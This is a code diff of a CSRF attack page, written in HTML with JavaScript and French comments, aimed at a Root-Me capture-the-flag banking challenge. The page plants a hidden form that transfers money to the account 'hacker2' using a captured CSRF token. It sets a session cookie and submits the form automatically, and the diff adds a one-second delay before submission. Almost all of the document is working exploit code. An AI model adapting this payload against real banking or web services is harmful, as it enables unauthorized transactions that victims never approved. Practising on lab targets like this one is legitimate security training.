@@ -1,15 +1,17 @@
 <form id="malicious-form" action="https://bankme-2.challenges.pro.root-me.org/transfer" method="post">
-    <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6aGFja2VyOjk3"> <!-- Token de hacker -->
-    <input type="text" name="recipient" value="hacker2"> <!-- Destinataire hacker2 -->
-    <input type="number" name="amount" value="1"> <!-- Montant à envoyer -->
+    <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6aGFja2VyOjk3">
+    <input type="text" name="recipient" value="hacker2">
+    <input type="number" name="amount" value="1">
     <button type="submit">Send Money</button>
  </form>
  
  <script>
     // Ajouter le cookie de session
-    document.cookie = "bankme2-session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.Z7kx7w.ryi7GRuLKMl2j-xLbRJioAVfJO4";
+    document.cookie = "bankme2-session=eyJ1c2VybmFtZSI6ImhhY2tlciJ9.Z7kx7w.ryi7GRuLKMl2j-xLbRJioAVfJO4; path=/; domain=bankme-2.challenges.pro.root-me.org;";
  
-    // Soumettre le formulaire automatiquement
-    document.getElementById('malicious-form').submit();
+    // Attendre que le formulaire soit prêt et soumettre
+    setTimeout(function() {
+       document.getElementById('malicious-form').submit();
+    }, 1000); // Attendre 1 seconde pour être sûr que le cookie est pris en compte
  </script>
  
